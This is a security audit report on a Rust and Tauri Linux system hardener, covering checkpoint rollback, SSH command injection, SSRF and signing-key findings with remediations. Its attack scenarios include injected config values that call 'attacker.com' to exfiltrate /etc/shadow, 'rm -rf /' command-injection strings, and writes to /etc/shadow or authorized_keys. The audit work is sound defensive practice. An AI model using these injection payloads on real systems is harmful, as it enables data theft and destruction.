# Security Audit Report -- Linux System Hardener

**Version:** 1.0
**Date:** 2026-02-25
**Scope:** Full workspace (11 crates + Tauri v2 desktop application)
**Methodology:** 6-domain parallel agent audit with merge coordinator consolidation

---

## 1. Executive Summary

A comprehensive security audit of the Linux System Hardener was conducted across six specialised domains: threat modelling, command execution and privilege, filesystem and state management, cryptography and integrity, network and input parsing, and frontend trust boundaries. The audit reviewed all 11 Rust crates, the Tauri v2 desktop application, and supporting infrastructure. From 136 raw findings (SA-001 through SA-136), deduplication and consolidation produced **63 unique findings**: 4 Critical, 10 High, 22 Medium, 19 Low, and 8 Informational (including 5 positive findings). The most severe issues centre on the checkpoint rollback path, where missing signature verification combined with absent path validation enables arbitrary file writes as root from a compromised SQLite database. The SSH remote executor's systemic use of shell-interpreted command strings creates multiple command injection vectors exploitable through user-controlled configuration directives. The cryptographic signing and audit logging subsystems are correctly implemented but never invoked in production code paths, rendering them inert. Overall, the codebase demonstrates strong fundamentals (parameterised SQL, Leptos XSS safety, correct algorithm choices, memory-safe Rust) but has critical gaps in the privilege escalation and integrity verification boundaries that must be addressed before production deployment.

---

## 2. Methodology

The audit employed a 6-agent parallel review approach, with each agent specialising in a distinct security domain:

| Agent | Domain | Focus Areas |
|-------|--------|-------------|
| Agent 1 | Threat Model | Trust boundaries, attack surfaces, data flows, privilege transitions, risk matrix |
| Agent 2 | Command Execution & Privilege | Command injection, argument injection, TOCTOU races, privilege escalation |
| Agent 3 | Filesystem & State | Path traversal, symlink attacks, atomic writes, SQLite integrity, checkpoint safety |
| Agent 4 | Cryptography & Integrity | Ed25519 signing, SHA-256 hash chain, key management, audit log integrity |
| Agent 5 | Network & Input Parsing | SSRF, SMTP injection, XSS, CSV injection, config parsing, SSH security |
| Agent 6 | Frontend Trust Boundary | Tauri IPC, CSP, capability ACLs, WASM serialisation, state management |

Each agent independently reviewed relevant source files, validated findings from prior agents, and produced domain-specific findings. A merge coordinator then deduplicated overlapping findings, consolidated descriptions and remediations, reassessed severities considering full attack chains, and produced this master report.

**Files reviewed:** 94 source files across all 11 crates and the Tauri application.
**Lines of code audited:** ~24,975 lines.

---

## 3. Findings Summary Table

| SAM-ID | Severity | Title | Primary Location | Original SA-IDs |
|--------|----------|-------|------------------|-----------------|
| SAM-001 | Critical | Checkpoint signature never verified before rollback | `manager.rs:602-628` | SA-004, SA-042, SA-069 |
| SAM-002 | Critical | Rollback writes to arbitrary paths as root without validation | `manager.rs:524-583` | SA-005, SA-043 |
| SAM-003 | Critical | AuditLogger never instantiated in production code | All production code | SA-080 |
| SAM-004 | Critical | JSON store integrity hash never verified in production | `json_store.rs:88-94` | SA-086 |
| SAM-005 | High | SSH executor uses shell-interpreted raw commands (architectural) | `executor/ssh.rs:73-86` | SA-036 |
| SAM-006 | High | SSH single-quote breakout in file path quoting | `executor/ssh.rs:105+` | SA-001, SA-088 |
| SAM-007 | High | SSH execute_command concatenates arguments without escaping | `executor/ssh.rs:186-192` | SA-002, SA-090 |
| SAM-008 | High | SSH write_file heredoc delimiter injection | `executor/ssh.rs:126-133` | SA-003, SA-089 |
| SAM-009 | High | Config directive values flow unsanitised to shell commands | `config.rs:53` -> plugins -> `ssh.rs` | SA-021, SA-022, SA-023, SA-024, SA-067, SA-104 |
| SAM-010 | High | SSRF via webhook URL without scheme or IP validation | `webhook.rs:28-39` | SA-007, SA-092 |
| SAM-011 | High | Signing key co-located with checkpoint database | `signing.rs:16`, `db.rs:10` | SA-062, SA-076 |
| SAM-012 | High | Signature does not cover file permissions or ownership | `manager.rs:211-237` | SA-063, SA-077 |
| SAM-013 | High | Audit log hash chain resets on every process restart | `audit.rs:233-236` | SA-009, SA-065, SA-079 |
| SAM-014 | High | Checkpoint signature verified by same key that signs (no trust separation) | `signing.rs:115-134` | SA-070 |
| SAM-015 | Medium | No input validation between IPC deserialisation and pkexec argument construction | `commands.rs:349-566` | SA-026, SA-027, SA-028, SA-106, SA-108, SA-110, SA-119 |
| SAM-016 | Medium | Config path from frontend enables root-privilege file read | `commands.rs:369-464` | SA-008, SA-031, SA-107, SA-120 |
| SAM-017 | Medium | Binary path resolution PATH fallback and TOCTOU race | `commands.rs:106-186` | SA-017, SA-030 |
| SAM-018 | Medium | Rollback continues after individual file restore failures | `manager.rs:607-620` | SA-045 |
| SAM-019 | Medium | Checkpoint file capture follows symlinks | `manager.rs:63-99` | SA-046 |
| SAM-020 | Medium | Backup file race with predictable path and symlink following | `file_utils.rs:296-365` | SA-050 |
| SAM-021 | Medium | Kernel plugin sysctl path construction from config directives | `kernel/mod.rs:331` | SA-051 |
| SAM-022 | Medium | Checkpoint existence check then read TOCTOU | `manager.rs:68-85` | SA-053 |
| SAM-023 | Medium | Read-modify-write race on sshd_config and PAM config files | `ssh/mod.rs:369-471` | SA-034, SA-054 |
| SAM-024 | Medium | Signing key file created with TOCTOU permission race | `signing.rs:86-91` | SA-006, SA-055, SA-072 |
| SAM-025 | Medium | update_file_atomically does not preserve file permissions | `file_utils.rs:30-63` | SA-013, SA-056 |
| SAM-026 | Medium | Parent directories created with default (world-readable) permissions | `signing.rs:81-83`, `db.rs:95-97` | SA-073 |
| SAM-027 | Medium | SQLite database created without restrictive permissions | `db.rs:100-102` | SA-012, SA-061, SA-084 |
| SAM-028 | Medium | Database operations not wrapped in transactions | `manager.rs:342-398, 506-522` | SA-047, SA-059 |
| SAM-029 | Medium | Foreign keys not enforced (PRAGMA never set) | `db.rs:99-117` | SA-058, SA-085 |
| SAM-030 | Medium | Private key stored as raw unencrypted bytes | `signing.rs:86-87` | SA-075 |
| SAM-031 | Medium | Hash input uses non-canonical serialisation with timestamp TOCTOU | `audit.rs:260-312` | SA-082 |
| SAM-032 | Medium | No signature verification in GUI checkpoint display path | `commands.rs:237-519` | SA-071 |
| SAM-033 | Medium | Webhook env variable expansion leaks secrets to external endpoints | `webhook.rs:46-63` | SA-010, SA-094 |
| SAM-034 | Medium | Webhook custom headers allow HTTP header injection | `webhook.rs:204-208` | SA-093 |
| SAM-035 | Medium | Email subject contains unsanitised hostname (SMTP injection vector) | `email.rs:86-101` | SA-096 |
| SAM-036 | Medium | CSV output vulnerable to formula injection | `csv.rs:110-116` | SA-100 |
| SAM-037 | Medium | No size limit on TOML config file parsing | `config_loader.rs:104-119` | SA-102 |
| SAM-038 | Medium | withGlobalTauri exposes IPC to all scripts in webview | `tauri.conf.json:13` | SA-117 |
| SAM-039 | Medium | Custom IPC commands not gated by capability ACLs | `capabilities/default.json` | SA-118 |
| SAM-040 | Medium | export_compliance_report allows arbitrary file write as user | `commands.rs:641-703` | SA-015, SA-121 |
| SAM-041 | Medium | std::sync::Mutex on RemoteState risks deadlock in async context | `commands.rs:27` | SA-126 |
| SAM-042 | Medium | No concurrency guards on privileged operations | `commands.rs:349-471` | SA-127 |
| SAM-043 | Medium | SSH key file path from frontend enables credential exfiltration | `commands.rs:878-901` | SA-109, SA-133 |
| SAM-044 | Medium | No rate limiting on pkexec-triggering IPC commands | `commands.rs:349-548` | SA-019, SA-135 |
| SAM-045 | Medium | Permissions plugin TOCTOU between check and chmod | `permissions/mod.rs:196-212` | SA-033, SA-049 |
| SAM-046 | Medium | SSH host key verification disabled without runtime warning | `cli.rs:53`, `ssh.rs:27` | SA-091 |
| SAM-047 | Low | Non-atomic write_file in LocalExecutor and rollback path | `local.rs:41-43`, `manager.rs:550` | SA-035, SA-044, SA-048 |
| SAM-048 | Low | Firewalld zone name from remote host used in commands | `firewalld.rs:47-52` | SA-025 |
| SAM-049 | Low | Permissions plugin allows arbitrary octal mode from config | `permissions/mod.rs:355-358` | SA-029 |
| SAM-050 | Low | Audit rules backup path symlink attack | `audit/mod.rs:304-337` | SA-052 |
| SAM-051 | Low | Audit log path not validated | `audit.rs:225` | SA-064 |
| SAM-052 | Low | Corrupted JSON in database silently produces empty data | `scan_manager.rs:232-245` | SA-016, SA-066 |
| SAM-053 | Low | User config loaded without integrity check for root operations | `config_loader.rs:60-63` | SA-068 |
| SAM-054 | Low | No key rotation mechanism | `signing.rs:19-42` | SA-074 |
| SAM-055 | Low | Hash chain comparison uses non-constant-time equality | `hash_chain.rs:75` | SA-078 |
| SAM-056 | Low | Signature input order depends on file state iteration order | `manager.rs:224-229` | SA-083 |
| SAM-057 | Low | Secret key bytes not zeroed after use in generate_key | `signing.rs:48-53` | SA-087 |
| SAM-058 | Low | HTML report severity field and framework name not escaped | `html.rs:33-116` | SA-011, SA-098, SA-099 |
| SAM-059 | Low | CSV control_id and framework fields not escaped | `csv.rs:51-60` | SA-101 |
| SAM-060 | Low | Commands inherit unsanitised environment and use bare command names | `local.rs:70-81`, `package/mod.rs:72` | SA-038, SA-039 |
| SAM-061 | Low | systemd install uses HOME env var for path construction | `systemd.rs:75-76` | SA-040 |
| SAM-062 | Low | Deeply nested TOML / large directive maps not bounded | `config_loader.rs:104-119` | SA-103 |
| SAM-063 | Low | Env variable override lacks plugin ID validation | `config_loader.rs:172-179` | SA-105 |
| SAM-064 | Low | Email body includes unsanitised absolute file path | `email.rs:127-129` | SA-097 |
| SAM-065 | Low | Webhook error response body logged without size limit | `webhook.rs:217` | SA-095 |
| SAM-066 | Low | Webhook notification has no circuit breaker or total timeout | `dispatcher.rs:98-128` | SA-113 |
| SAM-067 | Low | JSON store session ID not validated for path safety | `json_store.rs:38-41` | SA-114 |
| SAM-068 | Low | SSH connection error messages may leak sensitive details | `ssh.rs:59-62` | SA-111 |
| SAM-069 | Low | Error messages propagated to frontend contain internal paths | `commands.rs` (multiple) | SA-112, SA-132 |
| SAM-070 | Low | CSP allows unsafe-inline for style-src | `tauri.conf.json:24` | SA-020, SA-115 |
| SAM-071 | Low | validate_config reads arbitrary files as current user | `commands.rs:1151-1216` | SA-122 |
| SAM-072 | Low | save_scheduler_config writes frontend-controlled content without validation | `commands.rs:1031-1063` | SA-123 |
| SAM-073 | Low | JSON output parsing trusts CLI stdout without bounds checking | `commands.rs:381-442` | SA-125 |
| SAM-074 | Low | Theme value written to DOM attribute without allowlist validation | `theme_toggle.rs:66-75` | SA-129 |
| SAM-075 | Low | Checkpoint detail exposes file paths and permissions to frontend | `commands.rs:780-796` | SA-131 |
| SAM-076 | Low | WASM-Tauri parameter key casing inconsistency | `tauri_bindings.rs` | SA-134 |
| SAM-077 | Low | Dry-run executes CLI with user-controlled arguments | `commands.rs:393-445` | SA-032, SA-136 |
| SAM-078 | Low | Checkpoint name not validated for length or content | `manager.rs:248-295` | SA-019 |
| SAM-079 | Low | Checkpoint USER env var can be spoofed | `manager.rs:265` | SA-018 |
| SAM-P01 | Informational | Parameterised SQL queries throughout (no SQL injection) | All SQL files | SA-060 |
| SAM-P02 | Informational | Leptos view rendering is XSS-safe by default | `components/` | SA-128 |
| SAM-P03 | Informational | Tauri JSON deserialisation handles malformed input gracefully | `commands.rs` | SA-124 |
| SAM-P04 | Informational | localStorage stores only non-sensitive theme preference | `theme_toggle.rs` | SA-130 |
| SAM-P05 | Informational | CSP allows data: URIs for img-src (minor, documented) | `tauri.conf.json:24` | SA-116 |
| SAM-I01 | Informational | SSH sudo tee used unconditionally without checking remote user | `ssh.rs:126-133` | SA-037 |
| SAM-I02 | Informational | Remote command_exists() can be spoofed by compromised host | `ssh.rs:195-198` | SA-041 |
| SAM-I03 | Informational | Polkit policy uses auth_admin_keep for active sessions | `com.tidynest.linux-hardener.policy:14` | SA-014 |

---

## 4. Critical Findings

### SAM-001: Checkpoint Signature Never Verified Before Rollback

- **Severity:** Critical
- **CWE:** CWE-345, CWE-347 (Insufficient Verification of Data Authenticity / Improper Verification of Cryptographic Signature)
- **Location:** `crates/hardener-state/src/manager.rs:602-628`
- **Original SA-IDs:** SA-004, SA-042, SA-069

**Description:** The `rollback()` method retrieves checkpoint data and file states from the SQLite database, then immediately restores files to disk as root without verifying the checkpoint's Ed25519 signature. The `CheckpointSigner::verify()` method is fully implemented and tested (5 call sites in test code), but has **zero call sites in production code**. The signature is faithfully loaded from the database at line 431 and stored in the `Checkpoint` struct, creating the false impression of verification readiness. The signature flows through the CLI rollback path, the Tauri rollback path, and the core `CheckpointManager::rollback()` without ever being checked.

**Attack Scenario:** An attacker with write access to the SQLite checkpoint database (the user-writable DB at `~/.local/share/linux-hardener/checkpoints.db` or the system DB if permissions are lax) modifies the `content` column in `file_states` and the `file_path` column. When the user triggers a rollback (running as root via pkexec), the tampered content is written to arbitrary system paths. Combined with SAM-002, this enables complete system compromise.

**Remediation:** Before any file writes in `rollback()`, recompute the SHA-256 digest from the retrieved checkpoint metadata and file states, then call `self.signer.verify(digest, checkpoint.checkpoint_signature)`. Abort rollback immediately if verification fails. The signature computation should also be extended to cover permissions and ownership (see SAM-012).

---

### SAM-002: Rollback Writes to Arbitrary Paths as Root Without Validation

- **Severity:** Critical
- **CWE:** CWE-22 (Path Traversal), CWE-73 (External Control of File Name or Path)
- **Location:** `crates/hardener-state/src/manager.rs:524-583` (`restore_file_state_tracked()`)
- **Original SA-IDs:** SA-005, SA-043

**Description:** During rollback, `restore_file_state_tracked()` constructs a `Path` directly from `file_state.file_path` (a `String` loaded from SQLite) at line 530 with zero validation: no canonicalization, no allowlist check against known system config directories, no rejection of `..` components, and no symlink detection. The path is used for `fs::write()` (line 551), `fs::set_permissions()` (line 560), and `nix::unistd::chown()` (line 571), all running as root.

**Attack Scenario:** An attacker modifies the checkpoint database to include `file_path = "/etc/shadow"` with content containing a known password hash. Alternatively, `file_path = "/root/.ssh/authorized_keys"` with the attacker's public key. Triggering rollback as root overwrites the target file, giving the attacker root access.

**Remediation:** Validate all paths against an allowlist of known system configuration directories (e.g., `/etc/ssh/`, `/etc/sysctl.d/`, `/etc/security/`, `/etc/audit/`, `/etc/pam.d/`). Reject paths containing `..`, paths that resolve outside allowed prefixes after canonicalization, and paths that are symlinks (check with `symlink_metadata()`). This validation must be combined with SAM-001's signature verification for defence in depth.

---

### SAM-003: AuditLogger Never Instantiated in Production Code

- **Severity:** Critical
- **CWE:** CWE-778 (Insufficient Logging)
- **Location:** All production call sites (hardener-cli, hardener-core, hardener-plugins, hardener-scheduler, src-tauri)
- **Original SA-IDs:** SA-080

**Description:** The `AuditLogger` struct, its `log_action()` and `log_failure()` methods, and its `verify_integrity()` method are never called outside of test files. No audit entries are ever written during production scan, apply, rollback, or configuration operations. The entire tamper-evident audit logging system -- including the SHA-256 hash chain -- is dead code in production. For a security hardening tool that runs as root and modifies critical system files, the absence of an audit trail is a critical gap.

**Attack Scenario:** An attacker performs destructive operations (rollback to a malicious checkpoint, applying harmful hardening rules, weakening security configuration) with zero audit trail. There is no forensic evidence of what was done, when, or by whom.

**Remediation:** Integrate `AuditLogger` into critical code paths: CLI apply (log each plugin apply with result), CLI rollback (log checkpoint ID and outcome), checkpoint create/delete (log creation and deletion), and Tauri IPC-triggered operations. Create a shared `AuditLogger` instance in the execution `Context` and pass it through the call chain.

---

### SAM-004: JSON Store Integrity Hash Never Verified in Production

- **Severity:** Critical
- **CWE:** CWE-354 (Improper Validation of Integrity Check Value)
- **Location:** `crates/hardener-scheduler/src/json_store.rs:88-94`, `runner.rs:240-253`
- **Original SA-IDs:** SA-086

**Description:** The `JsonStore::write()` method computes a SHA-256 hash of exported JSON scan data and returns it alongside the file path. The runner stores this hash in the database via `complete_session()`. However, the `JsonStore::verify()` method that checks a file against its stored hash is never called in production code -- it exists only in tests. Exported JSON scan files can be tampered with on disk and the tampering is never detected.

**Attack Scenario:** An attacker modifies exported JSON scan files to hide critical findings or inject false findings. When these files are consumed by external compliance tools or auditors, they see fabricated data. The stored hash exists in the database but is never checked.

**Remediation:** Call `JsonStore::verify()` when reading JSON files back for any consumption path. Add verification to the compliance report generation and any code path that re-reads stored scan exports.

---

## 5. High Findings

### SAM-005: SSH Executor Uses Shell-Interpreted Raw Commands (Architectural)

- **Severity:** High
- **CWE:** CWE-78 (OS Command Injection)
- **Location:** `crates/hardener-core/src/executor/ssh.rs:73-86` (`run_command`)
- **Original SA-IDs:** SA-036

**Description:** All SSH executor operations use `session.raw_command(cmd)` which sends the command string to the remote shell for interpretation. This is the architectural root cause of SAM-006, SAM-007, and SAM-008. The `openssh` crate provides `session.command(program).arg(arg)` which handles argument escaping properly, but it is not used anywhere. Every method in `SshExecutor` manually constructs shell command strings, making any data that flows into these strings subject to shell interpretation.

**Remediation:** Replace `session.raw_command(cmd)` with `session.command(program).arg(arg1).arg(arg2)` for `execute_command()`. For file operations, use SFTP via the `openssh-sftp-client` crate or `session.command("cat").arg(path)`. This single architectural change would resolve SAM-006, SAM-007, and SAM-008 simultaneously.

---

### SAM-006: SSH Single-Quote Breakout in File Path Quoting

- **Severity:** High
- **CWE:** CWE-78 (OS Command Injection)
- **Location:** `crates/hardener-core/src/executor/ssh.rs:105,116,128,143,150-153`
- **Original SA-IDs:** SA-001, SA-088

**Description:** All SSH file operations construct shell commands by interpolating `path.display()` inside single quotes. A path containing a literal single quote character breaks out of the quoting context. Affected methods: `read_file`, `read_file_optional`, `write_file`, `path_exists`, `file_metadata`. While current paths are mostly hardcoded, the `SystemExecutor` trait is a public API, and the kernel plugin already uses config directives to construct `/proc/sys/` paths.

**Attack Scenario:** A config directive references a file path containing `'; rm -rf / #` which terminates the quote and injects arbitrary commands on the remote host.

**Remediation:** Use `shell_escape::escape()` or replace `'` with `'\''` in all paths. Preferably, resolve at the architectural level via SAM-005.

---

### SAM-007: SSH execute_command Concatenates Arguments Without Shell Escaping

- **Severity:** High
- **CWE:** CWE-78 (OS Command Injection)
- **Location:** `crates/hardener-core/src/executor/ssh.rs:186-192`
- **Original SA-IDs:** SA-002, SA-090

**Description:** The `execute_command()` method joins program name and arguments with spaces: `format!("{} {}", program, args.join(" "))`. Arguments are not shell-escaped. The firewall plugin's `apply_rule_directives()` reads port, source, protocol, and action from `config.directives` and these become arguments passed through this method, creating an exploitable path.

**Attack Scenario:** A config directive `ssh.port = "22; rm -rf /"` flows through `build_ufw_rule_args()` into `execute_command()` which joins with spaces; the shell interprets the semicolon as a command separator.

**Remediation:** Shell-escape each argument individually or use the openssh crate's `Command` builder. Preferably, resolve at the architectural level via SAM-005.

---

### SAM-008: SSH write_file Heredoc Delimiter Injection

- **Severity:** High
- **CWE:** CWE-78 (OS Command Injection)
- **Location:** `crates/hardener-core/src/executor/ssh.rs:126-133`
- **Original SA-IDs:** SA-003, SA-089

**Description:** The `write_file()` method uses a heredoc with delimiter `HARDENER_EOF`. If file content contains `\nHARDENER_EOF\n`, the heredoc terminates early and subsequent text is interpreted as shell commands under `sudo`. Config directive values from TOML flow directly into file content written by the kernel, SSH, and PAM plugins.

**Attack Scenario:** A kernel directive value of `0\nHARDENER_EOF\ncurl attacker.com/exfil?data=$(cat /etc/shadow)\n` terminates the heredoc and exfiltrates the shadow file.

**Remediation:** Generate a random heredoc delimiter per invocation, or use SFTP/stdin piping to avoid shell interpretation entirely. Preferably, resolve at the architectural level via SAM-005.

---

### SAM-009: Config Directive Values Flow Unsanitised to Shell Commands

- **Severity:** High
- **CWE:** CWE-78 (OS Command Injection), CWE-94 (Code Injection)
- **Location:** `crates/hardener-core/src/config.rs:53` (source), multiple plugin `apply()` methods (conduit), `executor/ssh.rs` (sink)
- **Original SA-IDs:** SA-021, SA-022, SA-023, SA-024, SA-067, SA-104

**Description:** `PluginConfig.directives` is a `HashMap<String, String>` populated directly from TOML config. Plugin `apply()` methods use these values without validation to construct system commands or file content. The kernel plugin writes values to `/proc/sys/` and `sysctl.conf`; the SSH plugin writes to `sshd_config`; the PAM plugin writes to `pwquality.conf` and `login.defs`; the firewall plugin uses values for port, source, protocol, and action fields passed to backend commands. When these values reach the SSH executor, they are concatenated into shell command strings without escaping.

**Attack Scenario:** A config file contains `[kernel.directives] "net.ipv4.ip_forward" = "0; curl attacker.com/$(cat /etc/shadow | base64)"`. The SSH executor concatenates this into a shell command, and the injected command exfiltrates sensitive data. Even on the local executor, directive values like `PermitRootLogin = "yes\nMatch all\nPermitRootLogin yes"` can inject multiline content into security-critical config files.

**Remediation:** Add validation functions for each directive type at config load time. Sysctl values: `^[0-9]+$`. Permission modes: `^[0-7]{3,4}$`. Firewall ports: `^[0-9]+(-[0-9]+)?$`. SSH directives: single-token, no newlines. Reject invalid values before they reach plugin code.

---

### SAM-010: SSRF via Webhook URL Without Scheme or IP Validation

- **Severity:** High
- **CWE:** CWE-918 (Server-Side Request Forgery)
- **Location:** `crates/hardener-scheduler/src/notification/webhook.rs:28-39`
- **Original SA-IDs:** SA-007, SA-092

**Description:** The `WebhookNotifier::new()` only checks that the URL is non-empty. No scheme validation, no hostname/IP blocklist, no DNS rebinding protection. The `reqwest::Client` follows redirects (up to 10 by default), meaning even an initial HTTPS URL could redirect to internal endpoints. Reachable targets include cloud metadata endpoints (AWS `169.254.169.254`, GCP `metadata.google.internal`), local services, and internal network addresses.

**Attack Scenario:** An attacker who controls the config file sets a webhook URL to the cloud metadata endpoint. On the next scheduled scan, the hardener daemon sends a POST request that can expose IAM credentials on cloud VMs.

**Remediation:** (1) Validate URL scheme is `https://` only (or `http://` with explicit opt-in flag). (2) Reject private/reserved IP ranges. (3) Resolve hostname and check resolved IP against blocklist (prevents DNS rebinding). (4) Disable redirect following or validate each redirect target.

---

### SAM-011: Signing Key Co-located with Checkpoint Database

- **Severity:** High
- **CWE:** CWE-522 (Insufficiently Protected Credentials)
- **Location:** `crates/hardener-state/src/signing.rs:16`, `crates/hardener-state/src/db.rs:10`
- **Original SA-IDs:** SA-062, SA-076

**Description:** The signing key (`/var/lib/linux-hardener/signing.key`) and the checkpoint database (`/var/lib/linux-hardener/checkpoints.db`) reside in the same directory. A single directory compromise gives an attacker both the data to tamper with and the key to forge signatures, nullifying the entire signing scheme even if SAM-001 is fixed.

**Remediation:** Store the signing key in a separate location with different access controls (e.g., `/etc/linux-hardener/signing.key` with 0400 root:root). Consider hardware-backed key storage or asymmetric verification where only the public key is present alongside the database.

---

### SAM-012: Signature Does Not Cover File Permissions or Ownership

- **Severity:** High
- **CWE:** CWE-345 (Insufficient Verification of Data Authenticity)
- **Location:** `crates/hardener-state/src/manager.rs:211-237`
- **Original SA-IDs:** SA-063, SA-077

**Description:** The `generate_signature()` method hashes checkpoint metadata and file content but excludes `file_permissions`, `file_owner_uid`, and `file_owner_gid`. These values are stored in the database and used during rollback to restore permissions and ownership. An attacker can change permissions (e.g., `0600` to `0777`) or ownership without invalidating the signature.

**Attack Scenario:** Attacker modifies `file_states.permissions` in the database to set `/etc/shadow` to mode `0644`. Even with SAM-001 fixed, the tampered permissions pass verification. After rollback, `/etc/shadow` becomes world-readable.

**Remediation:** Include `file_permissions`, `file_owner_uid`, and `file_owner_gid` in the hash computation for each file state.

---

### SAM-013: Audit Log Hash Chain Resets on Every Process Restart

- **Severity:** High
- **CWE:** CWE-354 (Improper Validation of Integrity Check Value)
- **Location:** `crates/hardener-state/src/audit.rs:233-236`
- **Original SA-IDs:** SA-009, SA-065, SA-079

**Description:** `AuditLogger::new()` always initialises the hash chain with `HashChain::new()` (genesis: 32 zero bytes). It never reads the existing log file to recover the last entry's hash. After any process restart, `verify_integrity()` reports tampering for the first entry of the new session (its `previous_hash` is genesis but the actual previous entry has a different hash). This makes verification always fail for multi-session logs, causing operators to ignore results. An attacker can truncate the log to the last restart boundary and append forged entries starting from genesis.

**Remediation:** On startup, read the last entry from the existing log file and initialise the `HashChain` with its hash value. If the log file does not exist, start from genesis.

---

### SAM-014: Checkpoint Signature Verified by Same Key That Signs (No Trust Separation)

- **Severity:** High
- **CWE:** CWE-295 (Improper Certificate Validation)
- **Location:** `crates/hardener-state/src/signing.rs:115-134`
- **Original SA-IDs:** SA-070

**Description:** The `CheckpointManager` holds a single `CheckpointSigner` used both to sign and to verify. The same private key that creates signatures derives the verification key. If the signing key is compromised, an attacker can forge valid signatures. There is no separate trust anchor, no public key pinning, and no way to verify checkpoints against a key the checkpoint manager does not control.

**Remediation:** Separate signing from verification. Options: (a) store only the public key alongside the database and keep the private key in a more restricted location; (b) embed the public key hash in the binary at build time; (c) store the public key hash in a separate root-only location for cross-verification.

---

## 6. Medium Findings

### SAM-015: No Input Validation Between IPC Deserialisation and pkexec Argument Construction

- **Severity:** Medium
- **CWE:** CWE-20 (Improper Input Validation), CWE-88 (Argument Injection)
- **Location:** `src-tauri/src/commands.rs:349-566`
- **Original SA-IDs:** SA-026, SA-027, SA-028, SA-106, SA-108, SA-110, SA-119

**Description:** Every string parameter received from the WASM frontend flows directly into `run_privileged_command()` arguments without sanitisation, format validation, or allowlist check. Affected: `plugin_ids`, `checkpoint_id`, `checkpoint name`. While `tokio::process::Command` uses `execve` (not a shell), argument injection remains possible (e.g., `"--config"` as a plugin ID), and polkit prompt abuse can confuse or fatigue users.

**Remediation:** (1) Validate `plugin_ids` against static allowlist. (2) Validate `checkpoint_id` matches UUID format. (3) Validate checkpoint name is 1-255 chars, alphanumeric with spaces/hyphens/underscores. (4) Insert `"--"` before positional arguments. (5) Add a generic `validate_ipc_string()` rejecting control characters and strings over 4096 bytes.

---

### SAM-016: Config Path From Frontend Enables Root-Privilege File Read

- **Severity:** Medium
- **CWE:** CWE-22 (Path Traversal)
- **Location:** `src-tauri/src/commands.rs:369-464`
- **Original SA-IDs:** SA-008, SA-031, SA-107, SA-120

**Description:** The `config_path` parameter from the frontend is passed to `pkexec hardener --config <path>`, causing the root-privilege CLI to read the file at any absolute path. TOML parse errors may leak content fragments. A crafted TOML file at a world-writable location could override security settings.

**Remediation:** Restrict `config_path` to allowed directories (`/etc/linux-hardener/`, `~/.config/linux-hardener/`). Canonicalise and reject `..` segments. Display the config path in the polkit prompt.

---

### SAM-017: Binary Path Resolution PATH Fallback and TOCTOU Race

- **Severity:** Medium
- **CWE:** CWE-426 (Untrusted Search Path), CWE-367 (TOCTOU Race Condition)
- **Location:** `src-tauri/src/commands.rs:106-186`
- **Original SA-IDs:** SA-017, SA-030

**Description:** `get_hardener_binary_path()` checks if a sibling binary exists, then falls back to PATH lookup. Between the existence check and pkexec invocation, the binary could be replaced. The PATH fallback returns bare `"hardener"` which pkexec resolves via its own PATH.

**Remediation:** Resolve the binary to a canonical absolute path, verify it is owned by root and not world-writable, and pass the absolute path to pkexec.

---

### SAM-018: Rollback Continues After Individual File Restore Failures

- **Severity:** Medium
- **CWE:** CWE-755 (Improper Handling of Exceptional Conditions)
- **Location:** `crates/hardener-state/src/manager.rs:607-620`
- **Original SA-IDs:** SA-045

**Description:** If one file fails to restore during rollback, the loop continues. The partially-rolled-back system may be in an inconsistent security state.

**Remediation:** Implement two-phase rollback: validate all files can be written first, then perform writes. Alternatively, create a pre-rollback checkpoint.

---

### SAM-019: Checkpoint File Capture Follows Symlinks

- **Severity:** Medium
- **CWE:** CWE-59 (Improper Link Resolution Before File Access)
- **Location:** `crates/hardener-state/src/manager.rs:63-99`
- **Original SA-IDs:** SA-046

**Description:** `capture_single_file()` uses `fs::metadata()` and `fs::read()` which follow symlinks. An attacker who replaces a config file with a symlink could cause the checkpoint to capture sensitive data from the symlink target.

**Remediation:** Use `fs::symlink_metadata()` to detect symlinks. Refuse to capture files that are symlinks or verify resolved paths are within expected directories.

---

### SAM-020: Backup File Race With Predictable Path and Symlink Following

- **Severity:** Medium
- **CWE:** CWE-367 (TOCTOU), CWE-377 (Insecure Temporary File)
- **Location:** `crates/hardener-common/src/file_utils.rs:296-365`
- **Original SA-IDs:** SA-050

**Description:** `backup_file()` creates backups at predictable paths (`{original}.backup`). An attacker can pre-create a symlink at the backup path; `std::fs::copy()` follows symlinks at the destination.

**Remediation:** Check that backup destination is not a symlink. Use `O_CREAT | O_EXCL` semantics. Reject if backup path already exists.

---

### SAM-021: Kernel Plugin sysctl Path Construction From Config Directives

- **Severity:** Medium
- **CWE:** CWE-22 (Path Traversal)
- **Location:** `crates/hardener-plugins/src/kernel/mod.rs:331`
- **Original SA-IDs:** SA-051

**Description:** Path construction uses `param_name.replace('.', "/")`. While current parameter names are hardcoded, the architecture relies on the hardcoded list rather than input validation.

**Remediation:** Validate sysctl parameter names match `^[a-zA-Z0-9_.]+$`. Verify constructed paths resolve within `/proc/sys/`.

---

### SAM-022: Checkpoint Existence Check Then Read TOCTOU

- **Severity:** Medium
- **CWE:** CWE-367 (TOCTOU Race Condition)
- **Location:** `crates/hardener-state/src/manager.rs:68-85`
- **Original SA-IDs:** SA-053

**Description:** `capture_single_file()` checks `file_path.exists()`, then separately calls `fs::metadata()` and `fs::read()`. Between these, the file could be replaced.

**Remediation:** Open the file once with `File::open()`, then use the file descriptor for both metadata and content reading.

---

### SAM-023: Read-Modify-Write Race on sshd_config and PAM Config Files

- **Severity:** Medium
- **CWE:** CWE-367 (TOCTOU Race Condition)
- **Location:** `crates/hardener-plugins/src/ssh/mod.rs:369-471`
- **Original SA-IDs:** SA-034, SA-054

**Description:** The SSH and PAM plugins read config files, modify in memory, then write back. Concurrent modifications by another process are silently overwritten.

**Remediation:** Use file locking (`flock()`) during the read-modify-write cycle.

---

### SAM-024: Signing Key File Created With TOCTOU Permission Race

- **Severity:** Medium
- **CWE:** CWE-377 (Insecure Temporary File), CWE-362 (Race Condition)
- **Location:** `crates/hardener-state/src/signing.rs:86-91`
- **Original SA-IDs:** SA-006, SA-055, SA-072

**Description:** The key file is created via `fs::write()` with umask permissions (typically `0644`), then restricted to `0600` via `fs::set_permissions()`. Between these operations, the private key is world-readable.

**Remediation:** Use `OpenOptions::new().write(true).create_new(true).mode(0o600).open(key_path)` to atomically create the file with correct permissions.

---

### SAM-025: update_file_atomically Does Not Preserve File Permissions

- **Severity:** Medium
- **CWE:** CWE-732 (Incorrect Permission Assignment)
- **Location:** `crates/hardener-common/src/file_utils.rs:30-63`
- **Original SA-IDs:** SA-013, SA-056

